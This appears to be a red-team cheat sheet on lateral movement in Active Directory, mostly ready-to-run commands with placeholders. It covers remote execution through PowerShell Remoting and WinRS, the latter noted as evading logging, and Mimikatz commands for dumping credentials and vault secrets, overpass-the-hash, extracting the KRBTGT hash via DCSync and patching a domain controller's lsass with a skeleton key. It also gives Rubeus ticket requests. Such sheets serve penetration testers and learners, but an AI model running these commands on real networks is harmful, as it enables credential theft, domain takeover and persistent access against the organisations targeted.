## Lateral Movement on Active Directory 


### PowerShell Remoting
---
Uses TCP-5985. T
```powershell
# Check computers where PS Remoting can be used
C:> . .\Find-PSRemotingLocalAdminAccess.ps1
C:> Find-PSRemotingLocalAdminAccess
```

- **Enable PowerShell Remoting:** From [M$ Documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.2), creates rules on computer firewall to allow remote connections. 
```powershell
C:> Enable-PSRemoting 
```
- **Create Remote Session:** [M$ Documented](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2)
```powershell
# Create a Session in Local Computer
C:> New-PSSession

# Create Session on Remote Computer
C:> $remote_computer = New-PSSesion -ComputerName <computer>

# Create Session on Multiple Computers
C:> $s1, $s2, $s3 = New-PSSession -ComputerName Server01,Server02,Server03
```
- **Entering into Existing PSSession**
```powershell
# A Completelly New Session to Computer
C:> Enter-PSSession -ComputerName <computer>

# A session created previously with New-PSSession
C:> $remote_computer = New-PSSesion -ComputerName <computer>
C:> Enter-PSSession -Session $remote_computer
```
- **Remote Execution**
```powershell
# Remote Execution With Credentials
c:> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
C:> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
C:> Invoke-Command -ComputerName <computer> -Credential $Cred -ScriptBlock {whoami}

# Run Local Script in Remote Computer
C:> Invoke-Command -FilePath c:\scripts\test.ps1 -ComputerName <computer>
C:> Invoke-Command -FilePath c:\scripts\test.ps1 -ComputerName (Get-Content <list_of_servers>)

# Run Command (Script Block) on Remote Computer
C:> Invoke-Command -ComputerName <host> -Credential <domain>\<user> -ScriptBlock {whoami;hostname}
C:> Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)

# Execute Locally Loaded Function in Remote Computer
C:> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <host>

# Persistent Connection, Series of Commands Sharing Data
C:> $s = New-PSSession -ComputerName <computer>                             # Without this, 2 lines below wouldn't share data on $s
C:> Invoke-Command -Session $s -ScriptBlock {$p = Get-Process PowerShell}
C:> Invoke-Command -Session $s -ScriptBlock {$p.VirtualMemorySize}          # $sp is from previous command

```

### WinRS
---
```powershell
# Check computers where WinRS can be used
C:> . .\Find-PSRemotingLocalAdminAccess.ps1
C:> Find-PSRemotingLocalAdminAccess
```
Uses same port as PSRemoting, and evades Remoting Logging.
- **Execute Remote Command**
```powershell
# Use `cmd`as command to get a shell
C:> winrs -remote:<computer> -u:<domain>\<user> -p:<password> <command>
```

### MimiKatz PowerShell Port
---
Requires Local Admin Privileges on computer where is run.
```powershell
C:> . .\Invoke-Mimikatz.ps1
```
- **Dump Credentials on Local Machine**
```powershell
C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```
- **OverPass the Hash (OPTH)**
```powershell
# Starts Powershell with logon type 9
C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:us.techcorp.local /aes256:<user_aes256key> /run:cmd.exe"'
```
- **Get KRBTGT Hash**
```powershell
# Run on DC, Domain Admin privileges required
C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <dc-hostname>

# DCSync: Domain Admin privileges required to run 
C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```
- **Credentials from Credential Vault**
```powershell
C:> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```
- **Patch a DC `lsass` process** allowing to use any user with single password. DA privileges are required.
```powershell
C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname_full_FQDN>
```
### Rubeus
---
##### OverPass The Hash
```powershell
C:> Rubeus.exe asktgt /user:<username> /aes256:<aes256_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
C:> Rubeus.exe asktgt /user:<username> /ntlm:<ntlm_rc4_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```
